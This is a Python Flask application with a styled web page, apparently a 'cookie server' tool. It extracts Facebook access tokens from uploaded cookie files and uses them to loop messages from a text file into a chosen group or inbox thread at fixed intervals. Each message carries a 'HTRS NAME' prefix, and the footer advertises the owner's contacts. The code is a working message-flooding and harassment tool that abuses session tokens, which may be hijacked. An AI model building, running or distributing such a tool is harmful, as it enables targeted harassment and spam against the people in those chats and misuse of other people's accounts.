from flask import Flask, request, jsonify
import requests
from threading import Thread, Event
import time
import os
import signal
import sys
import uuid
import re

app = Flask(__name__)
app.debug = True

# Shared HTTP headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Dictionary to store active threads and their events
active_threads = {}

def extract_token_from_cookie(cookie_string):
    """Extract access token from Facebook cookie string"""
    # Look for the token in the cookie string
    token_match = re.search(r'EAAG\w+', cookie_string)
    if token_match:
        return token_match.group(0)
    return None

def send_messages(cookies, thread_id, mn, time_interval, messages, task_id):
    stop_event = active_threads[task_id]['event']
    
    # Extract tokens from cookies
    access_tokens = []
    for cookie in cookies:
        token = extract_token_from_cookie(cookie)
        if token:
            access_tokens.append(token)
    
    if not access_tokens:
        print(f"Task {task_id}: No valid tokens found in cookies")
        if task_id in active_threads:
            del active_threads[task_id]
        return
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f'{mn} {message1}'
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Task {task_id}: Message sent using token {access_token[:10]}...")
                    else:
                        print(f"Task {task_id}: Failed to send message - Status {response.status_code}")
                except Exception as e:
                    print(f"Task {task_id}: Error sending message - {str(e)}")
                if not stop_event.is_set():
                    time.sleep(time_interval)

    # Cleanup when thread stops
    if task_id in active_threads:
        del active_threads[task_id]
        print(f"Task {task_id}: Stopped and cleaned up")

@app.route('/start', methods=['POST'])
def start_messages():
    try:
        cookie_file = request.files['cookieFile']
        cookies = cookie_file.read().decode().strip().splitlines()
        
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        
        # Generate unique task ID
        task_id = str(uuid.uuid4())
        
        # Create new stop event
        stop_event = Event()
        
        # Create and start new thread
        thread = Thread(target=send_messages, 
                       args=(cookies, thread_id, mn, time_interval, messages, task_id))
        
        # Store thread info
        active_threads[task_id] = {
            'thread': thread,
            'event': stop_event,
            'thread_id': thread_id,
            'start_time': time.time()
        }
        
        thread.start()
        return jsonify({'status': 'success', 'task_id': task_id})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stop/<task_id>', methods=['POST'])
def stop_messages(task_id):
    if task_id in active_threads:
        active_threads[task_id]['event'].set()
        return jsonify({'status': 'success', 'message': f'Stopping task {task_id}'})
    return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/status', methods=['GET'])
def get_status():
    status = {}
    for task_id, info in active_threads.items():
        status[task_id] = {
            'thread_id': info['thread_id'],
            'running_time': int(time.time() - info['start_time']),
            'active': info['thread'].is_alive()
        }
    return jsonify(status)

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝘼𝘼𝙔𝙐𝙎𝙃 𝙄𝙉𝙓𝙄𝘿𝙀 𝘾𝙊𝙊𝙆𝙄𝙀 𝙎𝙀𝙍𝙑𝙀𝙍</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @keyframes rgb-border {
            0% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.8); }
            33% { box-shadow: 0 0 15px rgba(0, 255, 0, 0.8); }
            66% { box-shadow: 0 0 15px rgba(0, 0, 255, 0.8); }
            100% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.8); }
        }
        
        @keyframes rgb-text {
            0% { color: rgba(255, 0, 0, 0.8); }
            33% { color: rgba(0, 255, 0, 0.8); }
            66% { color: rgba(0, 0, 255, 0.8); }
            100% { color: rgba(255, 0, 0, 0.8); }
        }
        
        @keyframes rgb-bg {
            0% { background-color: rgba(255, 0, 0, 0.1); }
            33% { background-color: rgba(0, 255, 0, 0.1); }
            66% { background-color: rgba(0, 0, 255, 0.1); }
            100% { background-color: rgba(255, 0, 0, 0.1); }
        }
        
        body {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .container {
            max-width: 400px;
            min-height: 600px;
            border-radius: 20px;
            padding: 25px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            animation: rgb-border 5s infinite;
            margin-top: 30px;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            animation: rgb-text 5s infinite;
            margin-bottom: 20px;
        }
        
        .form-label {
            font-weight: bold;
            animation: rgb-text 8s infinite;
            margin-bottom: 8px;
            display: block;
        }
        
        .form-control {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.4);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            color: white;
        }
        
        button.submit {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite, rgb-border 3s infinite;
            border: none;
            color: white;
            padding: 15px 30px;
            text-align: center;
            font-weight: bold;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 10px;
        }
        
        button.submit:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
        }
        
        button.stop {
            background: rgba(255, 0, 0, 0.7);
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            font-size: 14px;
            border-radius: 30px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        button.stop:hover {
            background: rgba(255, 0, 0, 0.9);
            transform: scale(1.05);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            animation: rgb-border 5s infinite;
        }
        
        .footer p {
            margin: 5px 0;
        }
        
        .whatsapp-link {
            display: inline-block;
            color: #25d366;
            text-decoration: none;
            margin-top: 10px;
            font-weight: bold;
        }
        
        .whatsapp-link:hover {
            color: #1da851;
            text-decoration: underline;
        }
        
        #activeThreads {
            margin-top: 30px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            animation: rgb-border 5s infinite;
        }
        
        #activeThreads h3 {
            animation: rgb-text 5s infinite;
            text-align: center;
            margin-bottom: 15px;
        }
        
        .task-item {
            padding: 10px;
            margin-bottom: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border-left: 4px solid;
            animation: rgb-bg 8s infinite;
        }
        
        .task-item p {
            margin: 5px 0;
        }
        
        input[type="file"]::file-selector-button {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite;
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            margin-right: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header class="header mt-4">
        <h1 class="mt-3">𝘼𝙔𝙐𝙎𝙃 𝐂𝐎𝐎𝐊𝐈𝐈𝐄 𝐒𝐄𝐑𝐕𝐄𝐑</h1>
    </header>
    <div class="container text-center">
        <form id="messageForm" onsubmit="startMessages(event)">
            <div class="mb-3">
                <label for="cookieFile" class="form-label">SELECT YOUR COOKIE FILE</label>
                <input type="file" class="form-control" id="cookieFile" name="cookieFile" required>
            </div>
            <div class="mb-3">
                <label for="threadId" class="form-label">GC/INBOX ID</label>
                <input type="text" class="form-control" id="threadId" name="threadId" required>
            </div>
            <div class="mb-3">
                <label for="kidx" class="form-label">HTRS NAME</label>
                <input type="text" class="form-control" id="kidx" name="kidx" required>
            </div>
            <div class="mb-3">
                <label for="time" class="form-label">TIME FIX (SECONDS)</label>
                <input type="number" class="form-control" id="time" name="time" required>
            </div>
            <div class="mb-3">
                <label for="txtFile" class="form-label">TEST FILE</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Start Sending Messages</button>
        </form>
        <div id="activeThreads">
            <h3>Active Tasks</h3>
            <div id="taskList"></div>
        </div>
    </div>
    <footer class="footer">
        <p>&copy; OWNER - 99YU XWD </p>
        <p>BUSINESS MEN <a href="https://www.facebook.com/profile.php?id=61578840652817" style="color: #3b5998; text-decoration: none;">CLICK FOR FACEBOOK</a></p>
        <div class="mb-3">
            <a href="https://wa.me/+919174751272" class="whatsapp-link">
                <i class="fab fa-whatsapp"></i> Chat on WhatsApp
            </a>
        </div>
    </footer>
    <script>
        function startMessages(event) {
            event.preventDefault();
            const form = document.getElementById('messageForm');
            const formData = new FormData(form);
            
            fetch('/start', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.status === 'success') {
                    alert('Task started successfully! Task ID: ' + data.task_id);
                    updateTaskList();
                } else {
                    alert('Error starting task: ' + data.message);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error starting task');
            });
        }

        function stopTask(taskId) {
            fetch('/stop/' + taskId, {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                updateTaskList();
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error stopping task');
            });
        }

        function updateTaskList() {
            fetch('/status')
            .then(response => response.json())
            .then(data => {
                const taskList = document.getElementById('taskList');
                taskList.innerHTML = '';
                for(const [taskId, info] of Object.entries(data)) {
                    if(info.active) {
                        const taskDiv = document.createElement('div');
                        taskDiv.className = 'task-item';
                        taskDiv.innerHTML = `
                            <p><strong>Task ID:</strong> ${taskId.substr(0,8)}...</p>
                            <p><strong>Thread ID:</strong> ${info.thread_id}</p>
                            <p><strong>Running Time:</strong> ${info.running_time}s</p>
                            <button onclick="stopTask('${taskId}')" class="stop">Stop Task</button>
                            <hr>
                        `;
                        taskList.appendChild(taskDiv);
                    }
                }
            });
        }

        // Update task list every 5 seconds
        setInterval(updateTaskList, 5000);
        // Initial update
        updateTaskList();
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
